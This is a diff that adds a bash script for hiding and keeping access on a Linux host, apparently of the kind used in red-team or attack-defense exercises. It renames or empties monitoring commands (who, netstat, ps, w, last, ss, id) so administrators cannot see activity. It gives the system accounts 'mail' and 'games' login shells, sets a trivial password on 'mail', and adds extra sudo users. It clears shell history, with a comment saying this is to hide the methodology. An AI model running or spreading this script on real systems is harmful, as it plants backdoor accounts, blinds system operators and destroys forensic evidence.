@@ -1,0 +1,107 @@
+#!/bin/bash
+
+# Function to rename and remove a command (without backup)
+rename_and_remove_no_backup() {
+    local cmd=$1
+    local new_cmd=$2
+    local path=$(which "$cmd" 2>/dev/null)
+
+    if [[ -n "$path" && -f "$path" ]]; then
+        echo "Renaming $cmd to $new_cmd and removing $cmd..."
+        sudo mv "$path" "/usr/bin/$new_cmd"  # Rename the command
+        sudo bash -c "cat /dev/null > /usr/bin/$cmd"  # Clear the original command file
+        echo "Command '$cmd' renamed to '$new_cmd' and removed successfully."
+    else
+        echo "Command '$cmd' not found or already removed."
+    fi
+    echo "-------------------------------"
+}
+
+# Function to permanently delete a command (NO backup)
+remove_permanently() {
+    local cmd=$1
+    local path=$(which "$cmd" 2>/dev/null)
+
+    if [[ -n "$path" && -f "$path" ]]; then
+        echo "Permanently deleting $cmd..."
+        sudo bash -c "cat /dev/null > $path"  # Overwrite the command file
+        echo "Command '$cmd' removed permanently."
+    else
+        echo "Command '$cmd' not found or already removed."
+    fi
+    echo "-------------------------------"
+}
+
+# Function to create a new user and add to sudoers group
+create_user_with_sudo() {
+    echo "Enter the username for the new user:"
+    read -r username
+
+    echo "Enter the password for user '$username':"
+    read -s password  # Read the password silently
+
+    echo "Creating user '$username' and adding to the sudo group..."
+
+    # Create the user
+    sudo useradd -m -s /bin/bash "$username"
+    echo "$username:$password" | sudo chpasswd  # Set the password
+
+    # Add user to the sudo group
+    sudo usermod -aG sudo "$username"
+
+    echo "User '$username' created and added to sudo group successfully."
+    echo "-------------------------------"
+}
+
+echo "Starting command renaming and removal script..."
+echo "-------------------------------"
+
+# Rename and remove (NO backup)
+rename_and_remove_no_backup "who" "why"
+rename_and_remove_no_backup "netstat" "ness"
+rename_and_remove_no_backup "ps" "eq"
+
+# Permanently remove (NO backup)
+remove_permanently "w"
+remove_permanently "uptime"
+remove_permanently "id"
+remove_permanently "last"
+remove_permanently "ss"
+
+# Change the shell of the user 'mail' to Bash
+echo "Changing the shell for user 'mail' to Bash..."
+sudo usermod -s /bin/bash mail
+echo "Shell changed successfully."
+
+# Set the password for the 'mail' user to 'mail'
+echo "Setting password for user 'mail'..."
+echo "mail:mail" | sudo chpasswd
+echo "Password set successfully."
+
+# Change the shell of the user 'games' to Bash (NO password change)
+echo "Changing the shell for user 'games' to Bash..."
+sudo usermod -s /bin/bash games
+echo "Shell changed successfully."
+
+# Ask if the user wants to create up to 4 new users
+count=0
+while [[ $count -lt 4 ]]; do
+    echo "Would you like to create a new sudo user? (y/n)"
+    read -r answer
+
+    if [[ "$answer" == "y" || "$answer" == "Y" ]]; then
+        create_user_with_sudo
+        ((count++))
+    else
+        break
+    fi
+done
+
+# Clear history to prevent giving away methodology
+echo "Clearing command history..."
+unset HISTFILE
+export HISTSIZE=0
+history -c
+echo "-------------------------------"
+
+echo "Process complete."
